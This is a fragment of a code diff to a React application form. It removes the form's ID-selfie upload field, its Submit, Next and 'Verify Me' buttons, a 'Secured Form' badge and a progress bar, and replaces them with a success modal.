-            <h3>Upload a picture of you holding up your ID</h3><br />
-            <div className="btn btn-proc" style={{width: "60px"}} >Upload </div>
-            <input type="file" required className={opacityShowThree} onChange={handleImageUploadFull} />
-            <div className="required">
-              Required 
-              
-            </div>
-          </div>
-        </div>}
-
-        {mssge && <div className="message">{mssge}</div> }
-
-        {pageTwo && <div className="submitRty">
-          {!isLoading && 
-          <Button style={{backgroundColor:"#ff7a3d",borderColor:"#ff7a3d"}} onClick={handleFormSubmit}>
-             <span>Submit Application</span>
-          </Button>}
-          {isLoading && <Button style={{backgroundColor:"#ff7a3d",borderColor:"#ff7a3d"}} disabled className='btnRty sub-btnRty'>
-             <span title='please wait Application is processing'> Processing Application <ImSpinner2 className='App-spin' /></span>
-          </Button>}
-        </div>}
-        {pageNext && <div className="submitRty" style={{marginTop: "30px"}}>
-          <Button style={{backgroundColor:"#ff7a3d",borderColor:"#ff7a3d"}} onClick={()=> HandleNextPage()}>
-             <span style={{color: "#fff"}}>  Next  </span>
-          </Button>
-        </div>}
-        {pageThree && <div className="submitRty" style={{marginTop: "30px"}}>
-          <Button style={{backgroundColor:"#ff7a3d",borderColor:"#ff7a3d"}} className='btnRty sub-btnRty' onClick={()=> handleNextTwo()}>
-             <span>  Verify Me  </span>
-          </Button>
-        </div>}
-      </form>
-
-      <div className="powered" bg="primary">
-        
-        <h3>
-         <BsFillShieldLockFill className='secure-icon' /> Secured Form 
-        </h3>
-      </div>
-      <Footer />
-      <div className="progressrty">
-        <ProgressBar
-          bgcolor="#ff7a3d"
-          progress={progress}
-          height={20}
-        />
-      </div>
+      <SuccessModal 
+        show={showSuccess} 
+        onClose={() => setShowSuccess(false)} 
+      />
     </div>
   )
 }
